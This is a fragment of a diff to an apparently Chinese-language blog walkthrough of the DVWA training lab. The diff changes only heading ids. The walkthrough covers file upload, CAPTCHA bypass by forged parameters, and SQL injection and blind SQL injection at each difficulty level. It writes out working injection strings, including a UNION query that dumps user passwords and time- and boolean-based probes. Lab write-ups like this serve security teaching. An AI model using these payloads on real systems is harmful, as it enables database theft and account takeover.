 <h2 id="impossible-4"><a href="#impossible-4" class="headerlink" title="impossible"></a>impossible</h2><hr>
 <?php 
@@ -910,7 +760,7 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 // Generate Anti-CSRF token 
 generateSessionToken(); 
 
-?><h2 id="-13"><a href="#-13" class="headerlink" title=" "></a> </h2><p>Impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p>
+?><h2 id="-12"><a href="#-12" class="headerlink" title=" "></a> </h2><p>Impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p>
 <h1 id="第六题-Insecure-CAPTCHA"><a href="#第六题-Insecure-CAPTCHA" class="headerlink" title="第六题-Insecure-CAPTCHA"></a>第六题-Insecure-CAPTCHA</h1><p><img src="https://image.3001.net/images/20161110/1478762521859.png!small"></p>
 <h2 id="low-4"><a href="#low-4" class="headerlink" title="low"></a>low</h2><h2 id="源代码-8"><a href="#源代码-8" class="headerlink" title="源代码"></a>源代码</h2><?php 
 
@@ -986,7 +836,7 @@ if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
     mysql_close(); 
 } 
 
-?><h2 id="-14"><a href="#-14" class="headerlink" title=" "></a> </h2><p>服务器将改密操作分成了两步，第一步检查用户输入的验证码，验证通过后，服务器返回表单，第二步客户端提交post请求，服务器完成更改密码的操作。但是，这其中存在明显的逻辑漏洞，服务器仅仅通过检查Change、step 参数来判断用户是否已经输入了正确的验证码。</p>
+?><h2 id="-13"><a href="#-13" class="headerlink" title=" "></a> </h2><p>服务器将改密操作分成了两步，第一步检查用户输入的验证码，验证通过后，服务器返回表单，第二步客户端提交post请求，服务器完成更改密码的操作。但是，这其中存在明显的逻辑漏洞，服务器仅仅通过检查Change、step 参数来判断用户是否已经输入了正确的验证码。</p>
 <p>首先输入密码，点击Change按钮，抓包：<br><img src="https://image.3001.net/images/20161110/1478762833724![]()!small"><br>修改密码成功：<br><img src="https://image.3001.net/images/20161110/1478762911998.png!small"></p>
 <h2 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h2><h2 id="源代码-9"><a href="#源代码-9" class="headerlink" title="源代码"></a>源代码</h2><?php 
 
@@ -1070,7 +920,7 @@ if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
     mysql_close(); 
 } 
 
-?><h2 id="-15"><a href="#-15" class="headerlink" title=" "></a> </h2><p>可以看到，Medium级别的代码在第二步验证时，参加了对参数passed_captcha的检查，如果参数值为true，则认为用户已经通过了验证码检查，然而用户依然可以通过伪造参数绕过验证，本质上来说，这与Low级别的验证没有任何区别。<br>抓到的包：<br><img src="https://image.3001.net/images/20161110/1478763222683.png!small"><br>更改之后的包：<br><img src="https://image.3001.net/images/20161110/14787632525623.png!small"><br>成功<br><img src="https://image.3001.net/images/20161110/14787632811739.png!small"></p>
+?><h2 id="-14"><a href="#-14" class="headerlink" title=" "></a> </h2><p>可以看到，Medium级别的代码在第二步验证时，参加了对参数passed_captcha的检查，如果参数值为true，则认为用户已经通过了验证码检查，然而用户依然可以通过伪造参数绕过验证，本质上来说，这与Low级别的验证没有任何区别。<br>抓到的包：<br><img src="https://image.3001.net/images/20161110/1478763222683.png!small"><br>更改之后的包：<br><img src="https://image.3001.net/images/20161110/14787632525623.png!small"><br>成功<br><img src="https://image.3001.net/images/20161110/14787632811739.png!small"></p>
 <h2 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h2><hr>
 <?php 
 
@@ -1120,7 +970,7 @@ if( isset( $_POST[ 'Change' ] ) ) {
 // Generate Anti-CSRF token 
 generateSessionToken(); 
 
-?><h2 id="-16"><a href="#-16" class="headerlink" title=" "></a> </h2><p>服务器的验证逻辑是当$resp是false，并且参数recaptcha_response_field不等于hidd3n_valu3或者http包头的User-Agent参数不等于reCAPTCHA时，就认为验证码输入错误，反之则认为已经通过了验证码的检查。<br>抓包<br><img src="https://image.3001.net/images/20161110/14787634573020.png!small"><br>更改参数recaptcha_response_field以及http包头的User-Agent：<br><img src="https://image.3001.net/images/20161110/1478763487811![]()!small"><br>密码修改成功：<br><img src="https://image.3001.net/images/20161110/14787635158708.png!small"></p>
+?><h2 id="-15"><a href="#-15" class="headerlink" title=" "></a> </h2><p>服务器的验证逻辑是当$resp是false，并且参数recaptcha_response_field不等于hidd3n_valu3或者http包头的User-Agent参数不等于reCAPTCHA时，就认为验证码输入错误，反之则认为已经通过了验证码的检查。<br>抓包<br><img src="https://image.3001.net/images/20161110/14787634573020.png!small"><br>更改参数recaptcha_response_field以及http包头的User-Agent：<br><img src="https://image.3001.net/images/20161110/1478763487811![]()!small"><br>密码修改成功：<br><img src="https://image.3001.net/images/20161110/14787635158708.png!small"></p>
 <h2 id="impossible-5"><a href="#impossible-5" class="headerlink" title="impossible"></a>impossible</h2><h2 id="源代码-10"><a href="#源代码-10" class="headerlink" title="源代码"></a>源代码</h2><p>if( isset( $_POST[ ‘Change’ ] ) ) {<br>    // Check Anti-CSRF token<br>    checkToken( $_REQUEST[ ‘user_token’ ], $_SESSION[ ‘session_token’ ], ‘index.php’ ); </p>
 <pre><code>// Hide the CAPTCHA form 
 $hide_form = true; 
@@ -1209,7 +1059,7 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
     mysql_close(); 
 } 
 
-?><h2 id="-17"><a href="#-17" class="headerlink" title=" "></a> </h2><p>Low级别的代码对来自客户端的参数id没有进行任何的检查与过滤，存在明显的SQL注入。</p>
+?><h2 id="-16"><a href="#-16" class="headerlink" title=" "></a> </h2><p>Low级别的代码对来自客户端的参数id没有进行任何的检查与过滤，存在明显的SQL注入。</p>
 <p>输入1，查询成功：</p>
 <p>输入1’and ‘1’ =’2，查询失败，返回结果为空：</p>
 <p>输入1’or ‘1234 ’=’1234，查询成功：</p>
@@ -1245,7 +1095,7 @@ if( isset( $_POST[ 'Submit' ] ) ) {
     //mysql_close(); 
 } 
 
-?><h2 id="-18"><a href="#-18" class="headerlink" title=" "></a> </h2><p>Medium级别的代码利用mysql_real_escape_string函数对特殊符号\x00,\n,\r,,‘,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。<br>1.判断是否存在注入，注入是字符型还是数字型</p>
+?><h2 id="-17"><a href="#-17" class="headerlink" title=" "></a> </h2><p>Medium级别的代码利用mysql_real_escape_string函数对特殊符号\x00,\n,\r,,‘,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。<br>1.判断是否存在注入，注入是字符型还是数字型</p>
 <p>抓包更改参数id为1 or 1=1 #，查询成功：</p>
 <p><img src="https://image.3001.net/images/20161122/1479798808442.png!small"></p>
 <p>说明存在数字型注入。</p>
@@ -1301,7 +1151,7 @@ if( isset( $_SESSION [ 'id' ] ) ) {
     mysql_close(); 
 } 
 
-?><h2 id="-19"><a href="#-19" class="headerlink" title=" "></a> </h2><p>可以看到，与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p>
+?><h2 id="-18"><a href="#-18" class="headerlink" title=" "></a> </h2><p>可以看到，与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p>
 <p>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。由于手工注入的过程与Low级别基本一样，直接最后一步演示下载数据。</p>
 <p>输入1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：</p>
 <p><img src="https://image.3001.net/images/20161122/14798014536165.png!small"></p>
@@ -1339,7 +1189,7 @@ if( isset( $_GET[ 'Submit' ] ) ) {
 // Generate Anti-CSRF token 
 generateSessionToken(); 
 
-?><h2 id="-20"><a href="#-20" class="headerlink" title=" "></a> </h2><p>Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。</p>
+?><h2 id="-19"><a href="#-19" class="headerlink" title=" "></a> </h2><p>Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。</p>
 <h1 id="第八题-SQL-Injection-Blind"><a href="#第八题-SQL-Injection-Blind" class="headerlink" title="第八题-SQL-Injection-(Blind)"></a>第八题-SQL-Injection-(Blind)</h1><h2 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2><h2 id="源代码-14"><a href="#源代码-14" class="headerlink" title="源代码"></a>源代码</h2><?php 
 
 if( isset( $_GET[ 'Submit' ] ) ) { 
@@ -1426,7 +1276,7 @@ if( isset( $_POST[ 'Submit' ]  ) ) {
     //mysql_close(); 
 } 
 
-?><h2 id="-21"><a href="#-21" class="headerlink" title=" "></a> </h2><p>Medium级别的代码利用mysql_real_escape_string函数对特殊符号</p>
+?><h2 id="-20"><a href="#-20" class="headerlink" title=" "></a> </h2><p>Medium级别的代码利用mysql_real_escape_string函数对特殊符号</p>
 <p>\x00,\n,\r,,‘,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。</p>
 <p>使用基于时间的盲注：</p>
 <p>抓包改参数id为1 and if(length(database())=4,sleep(5),1) #，明显延迟，说明数据库名的长度为4个字符；</p>
@@ -1464,7 +1314,7 @@ if( isset( $_COOKIE[ 'id' ] ) ) {
     mysql_close(); 
 } 
 
-?><h2 id="-22"><a href="#-22" class="headerlink" title=" "></a> </h2><p>High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p>
+?><h2 id="-21"><a href="#-21" class="headerlink" title=" "></a> </h2><p>High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p>
 <h2 id="虽然添加了LIMIT-1，但是我们可以通过-将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，这里我们可以使用基于布尔的盲注："><a href="#虽然添加了LIMIT-1，但是我们可以通过-将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，这里我们可以使用基于布尔的盲注：" class="headerlink" title="虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，这里我们可以使用基于布尔的盲注："></a>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，这里我们可以使用基于布尔的盲注：</h2><p>抓包将cookie中参数id改为1’ and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；</p>
 <p>抓包将cookie中参数id改为1’ and length(substr(( select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；</p>
 <h2 id="抓包将cookie中参数id改为1’-and-select-count-column-name-from-information-schema-columns-where-table-name-0x7573657273-8-，（0x7573657273-为users的16进制），显示存在，说明uers表有8个字段。"><a href="#抓包将cookie中参数id改为1’-and-select-count-column-name-from-information-schema-columns-where-table-name-0x7573657273-8-，（0x7573657273-为users的16进制），显示存在，说明uers表有8个字段。" class="headerlink" title="抓包将cookie中参数id改为1’ and (select count(column_name) from information_schema.columns where table_name=0x7573657273)=8 #，（0x7573657273 为users的16进制），显示存在，说明uers表有8个字段。"></a>抓包将cookie中参数id改为1’ and (select count(column_name) from information_schema.columns where table_name=0x7573657273)=8 #，（0x7573657273 为users的16进制），显示存在，说明uers表有8个字段。</h2><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><h2 id="源代码-17"><a href="#源代码-17" class="headerlink" title="源代码"></a>源代码</h2><?php 
@@ -1501,7 +1351,7 @@ if( isset( $_GET[ 'Submit' ] ) ) {
 // Generate Anti-CSRF token 
 generateSessionToken(); 
 
-?><h2 id="-23"><a href="#-23" class="headerlink" title=" "></a> </h2><p>可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti-CSRF token机制的加入了进一步提高了安全性。</p>
+?><h2 id="-22"><a href="#-22" class="headerlink" title=" "></a> </h2><p>可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti-CSRF token机制的加入了进一步提高了安全性。</p>
 <h1 id="第九题-XSS-Reflected"><a href="#第九题-XSS-Reflected" class="headerlink" title="第九题-XSS-(Reflected)"></a>第九题-XSS-(Reflected)</h1><h2 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h2><h2 id="源代码-18"><a href="#源代码-18" class="headerlink" title="源代码"></a>源代码</h2><?php 
 
 // Is there any input? 
